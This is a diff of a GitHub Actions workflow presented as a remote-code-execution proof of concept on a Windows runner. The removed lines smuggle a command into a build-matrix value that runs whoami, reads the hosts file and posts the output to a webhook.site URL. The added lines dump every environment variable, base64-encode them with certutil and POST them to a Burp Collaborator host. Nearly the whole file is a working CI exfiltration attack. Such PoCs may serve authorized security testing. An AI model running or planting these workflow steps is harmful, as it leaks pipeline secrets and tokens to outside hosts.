@@ -1,20 +1,15 @@
-name: Matrix Injection RCE PoC (Windows)
+name: Burp Collaborator RCE PoC
 
 on:
-  pull_request:
+  workflow_dispatch:  # Manual trigger — optional: replace with `pull_request` if needed
 
 jobs:
-  matrix_rce:
+  burp_rce:
     runs-on: windows-2022
-    strategy:
-      matrix:
-        target: [
-          "rce && whoami > result.txt && echo -------------------- >> result.txt && type C:\\Windows\\System32\\drivers\\etc\\hosts >> result.txt && curl -s -X POST --data-binary @result.txt https://webhook.site/a813eb6c-e727-4da0-bf4d-b215c95a855a"
-        ]
-        compiler: ["noop"]
-        mode: ["noop"]
     steps:
-      - name: Trigger Exploit via Matrix Injection
+      - name: Exfiltrate env to Burp Collaborator
         run: |
-          echo "Running: call build ${{ matrix.target }} ${{ matrix.compiler }} ${{ matrix.mode }}"
-          call build ${{ matrix.target }} ${{ matrix.compiler }} ${{ matrix.mode }} || exit /b 1
+          echo "[*] Running RCE PoC"
+          set > env.txt
+          certutil -encode env.txt env.b64
+          curl -X POST --data-binary @env.b64 https://9jtjqrcdeydkmt6ciz1v4sk8pzvqjg75.oastify.com
